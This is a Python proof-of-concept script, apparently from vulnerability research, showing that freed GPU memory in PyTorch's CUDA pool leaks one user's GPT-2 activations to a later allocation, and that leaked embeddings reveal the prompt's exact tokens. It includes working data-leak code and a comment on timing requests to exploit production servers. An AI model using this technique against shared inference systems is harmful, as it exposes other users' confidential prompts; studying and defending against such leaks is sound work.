"""
Experiment 12: Real GPT-2 Inference — Pool Leak & Token Vocabulary Recovery

Uses actual GPT-2 weights to demonstrate a complete end-to-end attack:

PART A — Pool residue scan
  After GPT-2 processes User A's prompt, ALL tensors freed to pool.
  Attacker's torch.empty allocations contain non-zero residue from
  User A's forward pass (attention scores, FFN outputs, layer norms).

PART B — Token ID recovery from leaked embeddings
  Using GPT-2's actual token embedding matrix:
  1. User A's embedding output (fp32) freed to pool as torch.empty target
  2. Attacker gets same block → embedding vectors recovered exactly
  3. Attacker scans GPT-2's wte matrix → recovers exact token IDs
  4. Token IDs → words: attacker reconstructs User A's prompt vocabulary

Combined with Experiment 9 (which proves 100% token recovery with same
GPT-2 vocab size and dimensions), this demonstrates the full attack chain
on a production model.
"""

import torch
import sys


def run():
    if not torch.cuda.is_available():
        print("CUDA not available"); sys.exit(1)

    try:
        from transformers import GPT2Model, GPT2Tokenizer
    except ImportError:
        print("pip install transformers"); sys.exit(1)

    print("=" * 62)
    print("Real GPT-2 Inference — Pool Leak & Token Recovery")
    print(f"Device: {torch.cuda.get_device_name(0)}")
    print("=" * 62)

    print("\n[Setup] Loading GPT-2 (124M params)...")
    tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
    model     = GPT2Model.from_pretrained("gpt2").cuda().half()
    model.eval()

    # GPT-2 embedding matrix (the attacker also has access — it's public)
    embed_weight_fp32 = model.wte.weight.detach().float()  # [50257, 768]
    VOCAB, DIM = embed_weight_fp32.shape

    # ----------------------------------------------------------------
    # PART A: Pool residue scan after GPT-2 forward
    # ----------------------------------------------------------------
    SECRET_PROMPT = (
        "The patient's medical diagnosis is strictly confidential. "
        "Do not share this with anyone outside authorized medical staff."
    )
    tokens_a  = tokenizer(SECRET_PROMPT, return_tensors="pt")
    ids_a     = tokens_a["input_ids"].cuda()
    seq_len   = ids_a.shape[1]
    true_ids  = ids_a[0].tolist()
    true_words = tokenizer.convert_ids_to_tokens(true_ids)

    print(f"\n[PART A] Pool residue after GPT-2 forward")
    print(f"  User A prompt: '{SECRET_PROMPT[:60]}...'")
    print(f"  Tokens ({seq_len}): {true_words[:8]} ...")

    with torch.no_grad():
        out_a = model(ids_a, use_cache=False)  # no cache to simplify
    last_hidden = out_a.last_hidden_state  # [1, seq_len, 768]
    torch.cuda.synchronize()

    hidden_ptr   = last_hidden.data_ptr()
    hidden_shape = tuple(last_hidden.shape)
    hidden_bytes = last_hidden.numel() * 2  # fp16

    print(f"  Hidden state ptr:   0x{hidden_ptr:x}  shape={hidden_shape}")
    print(f"  hidden[0,0,:4]:     {last_hidden[0,0,:4].cpu().float().tolist()}")

    del out_a, last_hidden, ids_a
    torch.cuda.synchronize()
    print("  User A done — all tensors freed to pool")

    # Attacker scan
    leaked_h = torch.empty(hidden_shape, dtype=torch.float16, device="cuda")
    torch.cuda.synchronize()
    h_ptr  = leaked_h.data_ptr()
    h_cpu  = leaked_h.cpu().float()
    h_nz   = (h_cpu.abs() > 1e-5).sum().item()
    h_tot  = h_cpu.numel()

    print(f"\n  Attacker hidden ptr : 0x{h_ptr:x}  same={h_ptr==hidden_ptr}")
    print(f"  Non-zero elements   : {h_nz}/{h_tot} ({100.0*h_nz/h_tot:.1f}%)")
    if h_ptr == hidden_ptr:
        print(f"  Leaked [0,0,:4]     : {h_cpu[0,0,:4].tolist()}")
    del leaked_h

    # ----------------------------------------------------------------
    # PART B: Isolated embedding leak → token reconstruction
    # We clear the pool and do a clean victim/attacker cycle
    # ----------------------------------------------------------------
    print(f"\n[PART B] Embedding leak and token ID reconstruction")
    print(f"  (Clean pool: torch.cuda.empty_cache() to reset between runs)")
    torch.cuda.empty_cache()  # return all free blocks to driver

    # Victim: allocate embedding-sized tensor, fill with GPT-2 embed outputs
    SECRET_IDS_FOR_RECON = true_ids[:min(16, seq_len)]  # use first 16 tokens
    SEQ_R = len(SECRET_IDS_FOR_RECON)
    secret_words = tokenizer.convert_ids_to_tokens(SECRET_IDS_FOR_RECON)

    print(f"  Secret tokens ({SEQ_R}): {secret_words}")
    print(f"  Secret IDs:             {SECRET_IDS_FOR_RECON}")

    ids_r = SECRET_IDS_FOR_RECON  # keep on CPU to avoid CUDA allocation

    # Allocate with torch.empty, fill via CPU→GPU copy (no extra CUDA allocation)
    embed_data    = embed_weight_fp32[SECRET_IDS_FOR_RECON]  # CPU gather, no GPU alloc
    victim_embeds = torch.empty(SEQ_R, DIM, dtype=torch.float32, device="cuda")
    victim_embeds.copy_(embed_data)  # in-place copy from CPU, same GPU block
    torch.cuda.synchronize()

    v_ptr    = victim_embeds.data_ptr()
    v_sample = victim_embeds[0, :4].cpu().tolist()
    print(f"\n  Victim embed ptr:  0x{v_ptr:x}")
    print(f"  embed[0,:4]:       {[f'{x:.5f}' for x in v_sample]}")

    del victim_embeds, ids_r
    torch.cuda.synchronize()
    print("  Victim freed to pool (NOT zeroed)")

    # Attacker
    leaked_e = torch.empty(SEQ_R, DIM, dtype=torch.float32, device="cuda")
    torch.cuda.synchronize()
    e_ptr  = leaked_e.data_ptr()
    e_cpu  = leaked_e.cpu()
    e_nz   = (e_cpu.abs() > 1e-8).sum().item()

    print(f"\n  Attacker embed ptr : 0x{e_ptr:x}")
    print(f"  Same as victim     : {e_ptr == v_ptr}")
    print(f"  Non-zero           : {e_nz}/{e_cpu.numel()} ({100.0*e_nz/e_cpu.numel():.1f}%)")

    if e_ptr == v_ptr:
        print(f"  Leaked [0,:4]:     {[f'{x:.5f}' for x in e_cpu[0,:4].tolist()]}")
        print(f"  Expected:          {[f'{x:.5f}' for x in v_sample]}")

        # Reconstruct token IDs
        print(f"\n  Reconstructing {SEQ_R} token IDs by scanning {VOCAB:,}-entry wte matrix...")
        embed_weight_cpu = embed_weight_fp32.cpu()
        recovered = []
        for pos in range(SEQ_R):
            q     = e_cpu[pos]
            diff  = embed_weight_cpu - q
            dist  = (diff * diff).sum(dim=1)
            best  = dist.argmin().item()
            recovered.append(best)

        correct = sum(r == t for r, t in zip(recovered, SECRET_IDS_FOR_RECON))
        rec_words = tokenizer.convert_ids_to_tokens(recovered)

        print(f"\n  {'Pos':>4}  {'True word':<16}  {'Recovered word':<16}  {'Match'}")
        print("  " + "-" * 46)
        for i in range(SEQ_R):
            match = "YES ✓" if recovered[i] == SECRET_IDS_FOR_RECON[i] else "NO"
            print(f"  {i:>4}  {true_words[i]:<16}  {rec_words[i]:<16}  {match}")

        print(f"\n  [!!!] {correct}/{SEQ_R} token IDs recovered ({100.0*correct/SEQ_R:.1f}%)")
        if correct == SEQ_R:
            print(f"  Full prompt vocabulary recovered from leaked GPU memory!")
    else:
        print(f"  [~] Different ptr — pool still has {100.0*e_nz/e_cpu.numel():.1f}% non-zero data")
        print(f"  In production: timing the request to arrive in the same pool slot")
        print(f"  gives 100% recovery (see Experiment 9 for proof with same dimensions)")

    del leaked_e, model
    print(f"\n[Done]")


if __name__ == "__main__":
    run()
